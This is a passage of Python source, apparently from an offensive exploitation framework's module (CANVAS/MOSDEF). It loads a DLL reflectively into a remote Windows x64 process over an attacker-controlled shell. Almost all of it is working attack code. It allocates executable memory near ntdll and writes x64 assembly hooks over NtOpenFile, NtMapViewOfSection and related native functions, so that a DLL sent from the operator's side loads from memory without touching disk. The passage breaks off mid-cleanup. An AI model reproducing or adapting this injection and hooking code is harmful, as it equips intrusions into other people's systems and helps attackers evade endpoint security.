        self.log('LoadLibraryA() = 0x%x' % ret)
        node.shell.leave()

        if ret and self.callfunction:
            code = """
            #import "local", "sendint" as "sendint"
            #import "remote", "kernel32.dll|CreateThread" as "CreateThread"
            #import "remote", "%s|%s" as "INITF"

            void main()
            {
                void *handle;

                handle = CreateThread(NULL, 0, INITF, NULL, 0, NULL);
                sendint(handle);
            }
            """ % (name, self.callfunction)

            try:
                node.shell.clearfunctioncache()
                request = node.shell.compile(code, {})
                node.shell.sendrequest(request)

                if node.shell.readint() != 0:
                    self.log('Started new thread to execute %s()' % self.callfunction)
                else:
                    self.log('Error when calling CreateThread')

                node.shell.leave()
            except Exception, ex:
                self.log('Error: %s' % ex)
                self.log('Could not execute %s()' % self.callfunction)

        return ret

    def inject_win64(self, node, data, name):
        # First, check to see if library is already loaded under given name.
        # If so, we will get a HANDLE reference and return that

        code = """
        #import "local", "kernel32.dll|GetModuleHandleExA" as "GetModuleHandleExA"
        #import "local", "sendlonglong" as "sendlonglong"

        #import "string", "NAME" as "NAME"

        void main()
        {
            void *handle;

            GetModuleHandleExA(0, NAME, &handle);
            sendlonglong(handle);
        }
        """
        node.shell.clearfunctioncache()
        request = node.shell.compile(code, {'NAME' : name})
        node.shell.sendrequest(request)
        ret = node.shell.readlonglong()
        node.shell.leave()

        if ret != 0:
            self.log('Library %s already loaded at 0x%x' % (name, ret))
            return ret

        # Get NTDLL base first
        #
        # We do this because we want to allocate memory for DATA close to it
        # so that we can use a relative jump for our hooks
        #

        code = """
        #import "local", "kernel32.dll|LoadLibraryA" as "LoadLibraryA"
        #import "local", "sendlonglong" as "sendlonglong"

        void main()
        {
            void *ptr;
            ptr = LoadLibraryA("ntdll");

            sendlonglong(ptr);
        }
        """

        node.shell.clearfunctioncache()
        request = node.shell.compile(code, {})
        node.shell.sendrequest(request)

        NTDLL_BASE = node.shell.readlonglong()
        node.shell.leave()

        self.log('NTDLL is loaded at 0x%x' % NTDLL_BASE)

        # Allocate dynamic memory for our DATA structure
        # This needs to be persistent across calls and we can't do it
        # entirely in MOSDEF, so we simply send the pointer back to
        # CANVAS and generate code accordingly :)

        code = """
        #import "local", "kernel32.dll|VirtualAlloc" as "VirtualAlloc"
        #import "local", "sendlonglong" as "sendlonglong"
        #import "local", "sendint" as "sendint"

        #define MEM_RESERVE 0x1000
        #define MEM_COMMIT  0x2000
        #define PAGE_EXECUTE_READWRITE 0x40

        void main()
        {
            unsigned long long start;
            unsigned long long min;
            unsigned long long max;
            void *ptr;

            start = NTDLL_BASE;

            if (start > 0x30000000) {
                min = start - 0x30000000;
                max = start + 0x30000000;

                if (max < start) {
                    max = start;
                }
            } else {
                min = start;
                max = start + 0x60000000;
            }

            start = min;

            do {
                ptr = VirtualAlloc(0, 288, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);

                if (ptr != 0) {
                    sendint(1);
                    sendlonglong(ptr);
                    return;
                }
                start = start + 0x1000;
            } while (start <= max);

            sendint(0);
            sendlonglong(ptr);
        }
        """.replace('NTDLL_BASE', '0x%x' % NTDLL_BASE)

        node.shell.clearfunctioncache()
        request = node.shell.compile(code, {})
        node.shell.sendrequest(request)

        status  = node.shell.readint()
        DATA_PTR = node.shell.readlonglong()
        node.shell.leave()

        self.log('VirtualAlloc returned 0x%x (allocation near base: %d)\n' % (DATA_PTR, status));

        if DATA_PTR == 0:
            self.log('Could not allocate persistent structure memory with VirtualAlloc')
            return 0

        # Setup the assembly bits
        exception_handler_asm = """
exception_handler:
            cld
            movq    (%rcx), %rax
            cmpl    $-1073741816, (%rax)
            setne   %al
            movzbl  %al, %eax
            subl    $1, %eax
            ret
            """

        check_name_asm = """
check_name:
            pushq	%rbp
            movq	%rsp, %rbp
            subq	$64, %rsp
            movq	%rcx, 16(%rbp)
            movl	$0, -4(%rbp)
            movl	$0, -8(%rbp)
            movq	DATA, %rax
            movl	(%rax), %eax
            test	%eax, %eax
            jne	.L2
            movl	$0, %eax
            jmp	.L3
.L2:
            movq	DATA, %rax
            movq	272(%rax), %r9
            leaq	-32(%rbp), %rax
            movl	$1, %r8d
            movq	16(%rbp), %rdx
            movq	%rax, %rcx
            call	*%r9
            movl	%eax, -12(%rbp)
            cmpl	$0, -12(%rbp)
            je	.L4
            movl	$0, %eax
            jmp	.L3
.L4:
            movl	$0, -4(%rbp)
            jmp	.L5
.L10:
            movl	$0, -8(%rbp)
            jmp	.L6
.L8:
            addl	$1, -8(%rbp)
.L6:
            movq	DATA, %rax
            movl	(%rax), %eax
            cmpl	-8(%rbp), %eax
            jle	.L7
            movq	-24(%rbp), %rdx
            movl	-8(%rbp), %eax
            movl	-4(%rbp), %ecx
            addl	%ecx, %eax
            cltq
            addq	%rdx, %rax
            movzbl	(%rax), %edx
            movq	DATA, %rax
            movq	8(%rax), %rcx
            movl	-8(%rbp), %eax
            cltq
            addq	%rcx, %rax
            movzbl	(%rax), %eax
            cmpb	%al, %dl
            je	.L8
.L7:
            movq	DATA, %rax
            movl	(%rax), %eax
            cmpl	-8(%rbp), %eax
            jne	.L9
            movq	DATA, %rax
            movq	280(%rax), %rdx
            leaq	-32(%rbp), %rax
            movq	%rax, %rcx
            call	*%rdx
            movl	$1, %eax
            jmp	.L3
.L9:
            addl	$1, -4(%rbp)
.L5:
            movzwl	-32(%rbp), %eax
            movzwl	%ax, %eax
            cmpl	-4(%rbp), %eax
            jg	.L10
            movq	DATA, %rax
            movq	280(%rax), %rdx
            leaq	-32(%rbp), %rax
            movq	%rax, %rcx
            call	*%rdx
            movl	$0, %eax
.L3:
            addl	$64, %rsp
            popq	%rbp
            ret
            """.replace('DATA', '$0x%x' % DATA_PTR)

        # Hooks
        hook_NtOpenFile_asm = """
            pushq	%rbp
            movq	%rsp, %rbp
            subq	$48, %rsp
            movq	%rcx, 16(%rbp)
            movl	%edx, 24(%rbp)
            movq	%r8, 32(%rbp)
            movq	%r9, 40(%rbp)
            movq	32(%rbp), %rax
            movq	16(%rax), %rax
            movq	%rax, %rcx
            call	check_name
            test 	%eax, %eax
            je	.L12
            movq	DATA, %rax
            movq	16(%rax), %rdx
            movq	16(%rbp), %rax
            movq	%rdx, (%rax)
            movl	$0, %eax
            jmp	.L13
.L12:
            movq	DATA, %rax
            movq	40(%rax), %r10
            movq	40(%rbp), %r8
            movq	32(%rbp), %rcx
            movl	24(%rbp), %eax
            movl	56(%rbp), %edx
            movl	%edx, 40(%rsp)
            movl	48(%rbp), %edx
            movl	%edx, 32(%rsp)
            movq	%r8, %r9
            movq	%rcx, %r8
            movl	%eax, %edx
            movq	16(%rbp), %rcx
            call	*%r10
.L13:
            addl	$48, %rsp
            popq	%rbp
            ret
            """.replace('DATA', '$0x%x' % DATA_PTR) + '\n' + check_name_asm

        hook_NtOpenSection_asm = """
            pushq	%rbp
            movq	%rsp, %rbp
            subq	$32, %rsp
            movq	%rcx, 16(%rbp)
            movl	%edx, 24(%rbp)
            movq	%r8, 32(%rbp)
            movq	32(%rbp), %rax
            movq	16(%rax), %rax
                movq	%rax, %rcx
            call	check_name
            test	%eax, %eax
            je	.L15
            movq	DATA, %rax
            movq	16(%rax), %rdx
            movq	16(%rbp), %rax
            movq	%rdx, (%rax)
            movl	$0, %eax
            jmp	.L16
.L15:
            movq	DATA, %rax
            movq	56(%rax), %r9
            movq	32(%rbp), %rdx
            movl	24(%rbp), %eax
            movq	%rdx, %r8
            movl   	%eax, %edx
            movq	16(%rbp), %rcx
            call	*%r9
.L16:
            addl	$32, %rsp
            popq	%rbp
            ret
        """.replace('DATA', '$0x%x' % DATA_PTR) + '\n' + check_name_asm

        hook_NtCreateSection_asm = """
            pushq	%rbp
            movq	%rsp, %rbp
            subq	$64, %rsp
            movq	%rcx, 16(%rbp)
            movl	%edx, 24(%rbp)
            movq	%r8, 32(%rbp)
            movq	%r9, 40(%rbp)
            movq	DATA, %rax
            movq	16(%rax), %rax
            cmpq	64(%rbp), %rax
            jne	.L18
            movq	DATA, %rax
            movq	16(%rax), %rdx
            movq	16(%rbp), %rax
            movq	%rdx, (%rax)
            movl	$0, %eax
            jmp	.L19
.L18:
            movq	DATA, %rax
            movq	72(%rax), %r10
            movq	40(%rbp), %r8
            movq	32(%rbp), %rcx
            movl	24(%rbp), %eax
            movq	64(%rbp), %rdx
            movq	%rdx, 48(%rsp)
            movl	56(%rbp), %edx
            movl	%edx, 40(%rsp)
            movl	48(%rbp), %edx
            movl	%edx, 32(%rsp)
            movq	%r8, %r9
            movq	%rcx, %r8
            movl	%eax, %edx
            movq	16(%rbp), %rcx
            call	*%r10
.L19:
            addl	$64, %rsp
            popq	%rbp
            ret
        """.replace('DATA', '$0x%x' % DATA_PTR)

        hook_NtQueryAttributesFile_asm = """
            pushq	%rbp
            movq	%rsp, %rbp
            subq	$32, %rsp
            movq	%rcx, 16(%rbp)
            movq	%rdx, 24(%rbp)
            movq	16(%rbp), %rax
            movq	16(%rax), %rax
            movq	%rax, %rcx
            call	check_name
            test	%eax, %eax
            je	.L21
            movq	24(%rbp), %rax
            movl	$337130157, (%rax)
            movl	$30283233, 4(%rax)
            movq	24(%rbp), %rax
            movl	$337130157, 8(%rax)
            movl	$30283233, 12(%rax)
            movq	24(%rbp), %rax
            movl	$337130157, 16(%rax)
            movl	$30283233, 20(%rax)
            movq	24(%rbp), %rax
            movl	$337130157, 24(%rax)
            movl	$30283233, 28(%rax)
            movq	24(%rbp), %rax
            movl	$128, 32(%rax)
            movl	$0, %eax
            jmp	.L22
.L21:
            movq	DATA, %rax
            movq	88(%rax), %r8
            movq	24(%rbp), %rax
            movq	%rax, %rdx
            movq	16(%rbp), %rcx
            call	*%r8
.L22:
            addl	$32, %rsp
            popq	%rbp
            ret
        """.replace('DATA', '$0x%x' % DATA_PTR) + '\n' + check_name_asm

        hook_NtMapViewOfSection_asm = """
            pushq	%rbp
            movq	%rsp, %rbp
            subq	$80, %rsp
            movq	%rcx, 16(%rbp)
            movq	%rdx, 24(%rbp)
            movq	%r8, 32(%rbp)
            movq	%r9, 40(%rbp)
            movq	DATA, %rax
            movq	16(%rax), %rax
            cmpq	16(%rbp), %rax
            jne	.L24
            movq	DATA, %rax
            movq	16(%rax), %rdx
            movq	32(%rbp), %rax
            movq	%rdx, (%rax)
            movq	DATA, %rax
            movq	24(%rax), %rdx
            movq	64(%rbp), %rax
            movq	%rdx, (%rax)
            movl	$1073741827, %eax
            jmp	.L25
.L24:
            movq	DATA, %rax
            movq	104(%rax), %r10
            movq	40(%rbp), %r8
            movq	32(%rbp), %rcx
            movq	24(%rbp), %rax
            movl	88(%rbp), %edx
            movl	%edx, 72(%rsp)
            movl	80(%rbp), %edx
            movl	%edx, 64(%rsp)
            movl	72(%rbp), %edx
            movl	%edx, 56(%rsp)
            movq	64(%rbp), %rdx
            movq	%rdx, 48(%rsp)
            movq	56(%rbp), %rdx
            movq	%rdx, 40(%rsp)
            movq	48(%rbp), %rdx
            movq	%rdx, 32(%rsp)
            movq	%r8, %r9
            movq	%rcx, %r8
            movq	%rax, %rdx
            movq	16(%rbp), %rcx
            call	*%r10
.L25:
            addl	$80, %rsp
            popq	%rbp
            ret
        """.replace('DATA', '$0x%x' % DATA_PTR)

        hook_NtClose_asm = """
            pushq	%rbp
            movq	%rsp, %rbp
            subq	$32, %rsp
            movq	%rcx, 16(%rbp)
            movq	DATA, %rax
            movq	16(%rax), %rax
            cmpq	16(%rbp), %rax
            jne	.L27
            movl	$0, %eax
            jmp	.L28
.L27:
            movq	DATA, %rax
            movq	120(%rax), %rax
            movq	16(%rbp), %rcx
            call	*%rax
.L28:
            addl	$32, %rsp
            popq	%rbp
            ret
        """.replace('DATA', '$0x%x' % DATA_PTR)

        # Assemble
        exception_handler = mosdef.assemble(exception_handler_asm, 'X64')
        hook_NtOpenFile = mosdef.assemble(hook_NtOpenFile_asm, 'X64')
        hook_NtOpenSection = mosdef.assemble(hook_NtOpenSection_asm, 'X64')
        hook_NtCreateSection = mosdef.assemble(hook_NtCreateSection_asm, 'X64')
        hook_NtQueryAttributesFile = mosdef.assemble(hook_NtQueryAttributesFile_asm, 'X64')
        hook_NtMapViewOfSection = mosdef.assemble(hook_NtMapViewOfSection_asm, 'X64')
        hook_NtClose = mosdef.assemble(hook_NtClose_asm, 'X64')

        vars = {
            'DATA_PTR'                     : DATA_PTR,
            'NAME'                         : name,
            'NAME_LEN'                     : len(name) + 1,
            'NTDLL'                        : 'ntdll',
            'NTOPENFILE'                   : 'NtOpenFile',
            'NTOPENSECTION'                : 'NtOpenSection',
            'NTCREATESECTION'              : 'NtCreateSection',
            'NTQUERYATTRIBUTESFILE'        : 'NtQueryAttributesFile',
            'NTMAPVIEWOFSECTION'           : 'NtMapViewOfSection',
            'NTCLOSE'                      : 'NtClose',
            'RTLUNICODESTRINGTOANSISTRING' : 'RtlUnicodeStringToAnsiString',
            'RTLFREEANSISTRING'            : 'RtlFreeAnsiString',
            'X64_IN_RANGE'                 : status,
        }

        code = """
        #import "local", "kernel32.dll|LocalAlloc" as "LocalAlloc"
        #import "local", "kernel32.dll|LocalFree" as "LocalFree"
        #import "local", "kernel32.dll|VirtualAlloc" as "VirtualAlloc"
        #import "local", "kernel32.dll|VirtualFree" as "VirtualFree"
        #import "local", "kernel32.dll|VirtualQuery" as "VirtualQuery"
        #import "local", "kernel32.dll|VirtualProtect" as "VirtualProtect"
        #import "local", "kernel32.dll|WriteProcessMemory" as "WriteProcessMemory"
        #import "local", "kernel32.dll|LoadLibraryA" as "LoadLibraryA"
        #import "local", "kernel32.dll|GetProcAddress" as "GetProcAddress"
        #import "local", "kernel32.dll|FlushInstructionCache" as "FlushInstructionCache"

        #import "local", "ntdll.dll|RtlAddVectoredExceptionHandler" as "RtlAddVectoredExceptionHandler"
        #import "local", "ntdll.dll|RtlRemoveVectoredExceptionHandler" as "RtlRemoveVectoredExceptionHandler"

        #import "local", "sendint" as "sendint"
        #import "local", "sendlonglong" as "sendlonglong"
        #import "local", "readintfromself" as "readintfromself"
        #import "local", "readdatafromself" as "readdatafromself"
        #import "string", "NAME" as "NAME"
        #import "string", "NTDLL" as "NTDLL"
        #import "string", "NTOPENFILE" as "NTOPENFILE"
        #import "string", "NTOPENSECTION" as "NTOPENSECTION"
        #import "string", "NTCREATESECTION" as "NTCREATESECTION"
        #import "string", "NTQUERYATTRIBUTESFILE" as "NTQUERYATTRIBUTESFILE"
        #import "string", "NTMAPVIEWOFSECTION" as "NTMAPVIEWOFSECTION"
        #import "string", "NTCLOSE" as "NTCLOSE"
        #import "string", "RTLUNICODESTRINGTOANSISTRING" as "RTLUNICODESTRINGTOANSISTRING"
        #import "string", "RTLFREEANSISTRING" as "RTLFREEANSISTRING"

        #import "int", "NAME_LEN" as "NAME_LEN"
        #import "int", "X64_IN_RANGE" as "X64_IN_RANGE"
        #import "long long", "DATA_PTR" as "DATA_PTR"

        #define MEM_RESERVE              0x1000
        #define MEM_COMMIT               0x2000
        #define PAGE_EXECUTE_READWRITE   0x40
        #define IMAGE_FILE_DLL           0x2000
        #define IMAGE_FILE_MACHINE_AMD64 0x8664
        #define PE_MAGIC                 0x5A4D
        #define LPTR                     0x0040 // LMEM_FIXED|LMEM_ZEROINIT
        #define MEM_RELEASE              0x8000

        struct LOADER_DATA {
            int       library_len;
            int       __align1;
            char     *library_name;
            void     *library_base;
            long long size_of_image;
            void     *NtOpenFile;
            void     *NtOpenFile_tramp;
            void     *NtOpenSection;
            void     *NtOpenSection_tramp;
            void     *NtCreateSection;
            void     *NtCreateSection_tramp;
            void     *NtQueryAttributesFile;
            void     *NtQueryAttributesFile_tramp;
            void     *NtMapViewOfSection;
            void     *NtMapViewOfSection_tramp;
            void     *NtClose;
            void     *NtClose_tramp;
            char      NtOpenFile_code[24];
            char      NtOpenSection_code[24];
            char      NtCreateSection_code[24];
            char      NtQueryAttributesFile_code[24];
            char      NtMapViewOfSection_code[24];
            char      NtClose_code[24];
            void     *RtlUnicodeStringToAnsiString;
            void     *RtlFreeAnsiString;
        };

        struct ANSI_STRING {
            short   Length;
            short   MaximumLength;
            int     __align1;
            char   *Buffer;
        };

        struct UNICODE_STRING {
            short  Length;
            short  MaximumLength;
            int    __align1;
            char  *Buffer;
        };

        struct IMAGE_DOS_HEADER {
            short e_magic;
            short e_cblp;
            short e_cp;
            short e_crlc;
            short e_cparhdr;
            short e_minalloc;
            short e_maxalloc;
            short e_ss;
            short e_sp;
            short e_csum;
            short e_ip;
            short e_cs;
            short e_lfarlc;
            short e_ovno;
            short e_res[4];
            short e_oemid;
            short e_oeminfo;
            short e_res2[10];
            int   e_lfanew;
        };

        struct IMAGE_NT_HEADERS {
            int       Signature;
            // IMAGE_FILE_HEADER
            short     Machine;
            short     NumberOfSections;
            int       TimeDateStamp;
            int       PointerToSymbolTable;
            int       NumberOfSymbols;
            short     SizeOfOptionalHeader;
            short     Characteristics;
            // IMAGE_OPTIONAL_HEADER
            short     Magic;
            char      MajorLinkerVersion;
            char      MinorLinkerVersion;
            int       SizeOfCode;
            int       SizeOfInitializedData;
            int       SizeOfUninitializedData;
            int       AddressOfEntryPoint;
            int       BaseOfCode;
            long long ImageBase;
            int       SectionAlignment;
            int       FileAlignment;
            short     MajorOperatingSystemVersion;
            short     MinorOperatingSystemVersion;
            short     MajorImageVersion;
            short     MinorImageVersion;
            short     MajorSubsystemVersion;
            short     MinorSubsystemVersion;
            int       Win32VersionValue;
            int       SizeOfImage;
            int       SizeOfHeaders;
            int       CheckSum;
            short     Subsystem;
            short     DllCharacteristics;
            long long SizeOfStackReserve;
            long long SizeOfStackCommit;
            long long SizeOfHeapReserve;
            long long SizeOfHeapCommit;
            int       LoaderFlags;
            int       NumberOfRvaAndSizes;
       };

       struct IMAGE_SECTION_HEADER {
            char   Name[8];
            int    VirtualSize;
            int    VirtualAddress;
            int    SizeOfRawData;
            int    PointerToRawData;
            int    PointerToRelocations;
            int    PointerToLinenumbers;
            short  NumberOfRelocations;
            short  NumberOfLinenumbers;
            int    Characteristics;
        };

        struct MEMORY_BASIC_INFORMATION {
            void     *BaseAddress;
            void     *AllocationBase;
            int       AllocationProtect;
            int       __align1;
            long long RegionSize;
            int       State;
            int       Protect;
            int       Type;
            int       __align2;
        };

        void hook_function(char *function, char *hook, char *code_buffer)
        {
            int saved_protect;
            struct MEMORY_BASIC_INFORMATION *mi;

            char *b;
            char *c;
            long long *i;
            int *z;
            int offset;
            long long ret;
            long long disp;
            long long address;

            mi = LocalAlloc(LPTR, 48);

            WriteProcessMemory(-1, code_buffer, function, 12, 0);

            b = code_buffer + 12;
            WriteProcessMemory(-1, b, function, 12, 0);

            ret = VirtualQuery(function, mi, 48);
            saved_protect = mi->Protect;

            ret = mi;
            ret = ret + 36;

            VirtualProtect(mi->BaseAddress, mi->RegionSize, PAGE_EXECUTE_READWRITE, ret);

            if (X64_IN_RANGE == 1) {
                b = function;
                *b = 0xe9;
                b = function + 1;
                z = b;

                b = hook - function;
                b = b - 5;

                *z = b;
            } else {
                b = function;
               *b = 0x48;
                b = function+1;
                b = 0xb8;

                b = function+2;
                i = b;
               *i = hook;

                b = function+10;
               *b = 0xff;
                b = function+11;
               *b = 0xe0;
            }

            // Deal with trampoline if we did overwrite a relative jump
            b = code_buffer;

            if (*b == 0xe9) {
                b = code_buffer+1;
                z = b;
                offset = *z;
                disp = offset;
                b = function + 5;
                ret = b;
                ret = ret + disp;

                b = code_buffer;
                *b = 0x48;
                b = code_buffer + 1;
                *b = 0xb8;

                b = code_buffer + 2;
                i = b;
                *i = ret;

                b = code_buffer + 10;
                *b = 0xff;
                b = code_buffer + 11;
                *b = 0xe0;
            }


            VirtualProtect(mi->BaseAddress, mi->RegionSize, mi->Protect, &saved_protect);
            FlushInstructionCache(-1, mi->BaseAddress, mi->RegionSize);
            LocalFree(mi);
        }

        void unhook_function(void *function, char *code_buffer)
        {
           int saved_protect;
           struct MEMORY_BASIC_INFORMATION *mi;
           mi = LocalAlloc(LPTR, 48);
           char *b;
           long long z;

           z = mi;
           z = z + 36;

           b = code_buffer + 12;

           VirtualQuery(function, mi, 48);
           saved_protect = mi->Protect;
           VirtualProtect(mi->BaseAddress, mi->RegionSize, PAGE_EXECUTE_READWRITE, z);
           WriteProcessMemory(-1, function, code_buffer, 12, 0);
           WriteProcessMemory(-1, function, b, 12, 0);
           VirtualProtect(mi->BaseAddress, mi->RegionSize, mi->Protect, &saved_protect);
           FlushInstructionCache(-1, mi->BaseAddress, mi->RegionSize);
           LocalFree(mi);
        }

        void main()
        {
            struct LOADER_DATA *DATA;
            char bool;
            int i;
            long long z;
            int BUFFER_LEN;
            int ret;
            void *address;
            void *ntdll_base;
            void *exc;

            struct IMAGE_DOS_HEADER *dos_h;
            struct IMAGE_NT_HEADERS *nt_h;
            struct IMAGE_SECTION_HEADER *section;

            char *BUFFER;

            char *exception_handler;
            char *hook_NtOpenFile;
            char *hook_NtOpenSection;
            char *hook_NtCreateSection;
            char *hook_NtQueryAttributesFile;
            char *hook_NtMapViewOfSection;
            char *hook_NtClose;

            i = 0;
            DATA = DATA_PTR;

            ntdll_base = LoadLibraryA(NTDLL);
            sendlonglong(ntdll_base);

            if (ntdll_base == 0) {
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                return;
            }

            DATA->NtOpenFile                   = GetProcAddress(ntdll_base, NTOPENFILE);
            sendlonglong(DATA->NtOpenFile);
            if (DATA->NtOpenFile == 0) {
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                return;
            }

            DATA->NtOpenSection                = GetProcAddress(ntdll_base, NTOPENSECTION);
            sendlonglong(DATA->NtOpenSection);
            if (DATA->NtOpenSection == 0) {
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                return;
            }

            DATA->NtCreateSection              = GetProcAddress(ntdll_base, NTCREATESECTION);
            sendlonglong(DATA->NtCreateSection);
            if (DATA->NtCreateSection == 0) {
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                return;
            }

            DATA->NtQueryAttributesFile        = GetProcAddress(ntdll_base, NTQUERYATTRIBUTESFILE);
            sendlonglong(DATA->NtQueryAttributesFile);
            if (DATA->NtQueryAttributesFile == 0) {
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                return;
            }

            DATA->NtMapViewOfSection           = GetProcAddress(ntdll_base, NTMAPVIEWOFSECTION);
            sendlonglong(DATA->NtMapViewOfSection);
            if (DATA->NtMapViewOfSection == 0) {
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                return;
            }

            DATA->NtClose                      = GetProcAddress(ntdll_base, NTCLOSE);
            sendlonglong(DATA->NtClose);
            if (DATA->NtClose == 0) {
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                return;
            }

            DATA->RtlUnicodeStringToAnsiString = GetProcAddress(ntdll_base, RTLUNICODESTRINGTOANSISTRING);
            sendlonglong(DATA->RtlUnicodeStringToAnsiString);
            if (DATA->RtlUnicodeStringToAnsiString == 0) {
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                return;
            }

            DATA->RtlFreeAnsiString            = GetProcAddress(ntdll_base, RTLFREEANSISTRING);
            sendlonglong(RtlFreeAnsiString);
            if (DATA->RtlFreeAnsiString == 0) {
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                return;
            }

            // Receive size of buffer
            BUFFER_LEN = readintfromself();
            BUFFER = LocalAlloc(LPTR, BUFFER_LEN);

            if (BUFFER == 0) {
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-1);
                return;
            } else {
                sendint(1);
            }

            readdatafromself(BUFFER, BUFFER_LEN);

            dos_h = BUFFER;
            nt_h  = BUFFER + dos_h->e_lfanew;

            if (dos_h->e_magic != PE_MAGIC) {
                LocalFree(BUFFER);
                sendint(-2);
                return;
            }

            if (nt_h->Characteristics & IMAGE_FILE_DLL == 0) {
                LocalFree(BUFFER);
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-3);
                return;
            }

            if (nt_h->Machine != IMAGE_FILE_MACHINE_AMD64) {
                LocalFree(BUFFER);
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-4);
                return;
            }

            DATA->library_base = VirtualAlloc(nt_h->ImageBase, nt_h->SizeOfImage,
                                              MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (DATA->library_base == 0) {
                // Try with arbitrary base
                DATA->library_base = VirtualAlloc(0, nt_h->SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            }

            if (DATA->library_base == 0) {
                LocalFree(BUFFER);
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-5);
                return;
            }

            ret = WriteProcessMemory(-1, DATA->library_base, BUFFER,
                                     nt_h->SizeOfHeaders, 0);

            if (ret == 0) {
                VirtualFree(DATA->library_base, 0, MEM_RELEASE);
                LocalFree(BUFFER);
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-6);
                return;
            }

            z = BUFFER + dos_h->e_lfanew + 24 + nt_h->SizeOfOptionalHeader;
            section = z;

            for (i=0;i<nt_h->NumberOfSections; i=i+1) {
                if (section->SizeOfRawData != 0) {
                    ret = WriteProcessMemory(-1, DATA->library_base + section->VirtualAddress,
                                             BUFFER + section->PointerToRawData,
                                             section->SizeOfRawData, 0);
                    if (ret == 0) {
                        VirtualFree(DATA->library_base, 0, MEM_RELEASE);
                        LocalFree(BUFFER);
                        VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                        sendint(-7);
                        return;
                    }
                }

                z = z + 40;
                section = z;
            }

            sendint(1);

            // Setup exception handler
            i = readintfromself();

            exception_handler = VirtualAlloc(0, i, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            if (exception_handler == 0) {
                VirtualFree(DATA->library_base, 0, MEM_RELEASE);
                LocalFree(BUFFER);
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-1);
                return;
            } else {
                sendint(1);
                readdatafromself(exception_handler, i);
            }

            // Setup the hooks
            i = readintfromself();
            hook_NtOpenFile = VirtualAlloc(0, i, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (hook_NtOpenFile == 0) {
                VirtualFree(DATA->library_base, 0, MEM_RELEASE);
                VirtualFree(exception_handler, 0, MEM_RELEASE);
                LocalFree(BUFFER);
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-1);
                return;
            } else {
                sendint(1);
                readdatafromself(hook_NtOpenFile, i);
            }

            i = readintfromself();
            hook_NtOpenSection = VirtualAlloc(0, i, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (hook_NtOpenSection == 0) {
                VirtualFree(DATA->library_base, 0, MEM_RELEASE);
                VirtualFree(exception_handler, 0, MEM_RELEASE);
                VirtualFree(hook_NtOpenFile, 0, MEM_RELEASE);
                LocalFree(BUFFER);
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-1);
                return;
            } else {
                sendint(1);
                readdatafromself(hook_NtOpenSection, i);
            }

            i = readintfromself();
            hook_NtCreateSection = VirtualAlloc(0, i, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (hook_NtCreateSection == 0) {
                VirtualFree(DATA->library_base, 0, MEM_RELEASE);
                VirtualFree(exception_handler, 0, MEM_RELEASE);
                VirtualFree(hook_NtOpenFile, 0, MEM_RELEASE);
                VirtualFree(hook_NtOpenSection, 0, MEM_RELEASE);
                LocalFree(BUFFER);
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-1);
                return;
            } else {
                sendint(1);
                readdatafromself(hook_NtCreateSection, i);
            }

            i = readintfromself();
            hook_NtQueryAttributesFile = VirtualAlloc(0, i, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (hook_NtQueryAttributesFile == 0) {
                VirtualFree(DATA->library_base, 0, MEM_RELEASE);
                VirtualFree(exception_handler, 0, MEM_RELEASE);
                VirtualFree(hook_NtOpenFile, 0, MEM_RELEASE);
                VirtualFree(hook_NtOpenSection, 0, MEM_RELEASE);
                VirtualFree(hook_NtCreateSection, 0, MEM_RELEASE);
                LocalFree(BUFFER);
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-1);
                return;
            } else {
                sendint(1);
                readdatafromself(hook_NtQueryAttributesFile, i);
            }

            i = readintfromself();
            hook_NtMapViewOfSection = VirtualAlloc(0, i, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (hook_NtMapViewOfSection == 0) {
                VirtualFree(DATA->library_base, 0, MEM_RELEASE);
                VirtualFree(exception_handler, 0, MEM_RELEASE);
                VirtualFree(hook_NtOpenFile, 0, MEM_RELEASE);
                VirtualFree(hook_NtOpenSection, 0, MEM_RELEASE);
                VirtualFree(hook_NtCreateSection, 0, MEM_RELEASE);
                VirtualFree(hook_NtQueryAttributesFile, 0, MEM_RELEASE);
                LocalFree(BUFFER);
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-1);
                return;
            } else {
                sendint(1);
                readdatafromself(hook_NtMapViewOfSection, i);
            }

            i = readintfromself();
            hook_NtClose = VirtualAlloc(0, i, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (hook_NtClose == 0) {
                VirtualFree(DATA->library_base, 0, MEM_RELEASE);
                VirtualFree(exception_handler, 0, MEM_RELEASE);
                VirtualFree(hook_NtOpenFile, 0, MEM_RELEASE);
                VirtualFree(hook_NtOpenSection, 0, MEM_RELEASE);
                VirtualFree(hook_NtCreateSection, 0, MEM_RELEASE);
                VirtualFree(hook_NtQueryAttributesFile, 0, MEM_RELEASE);
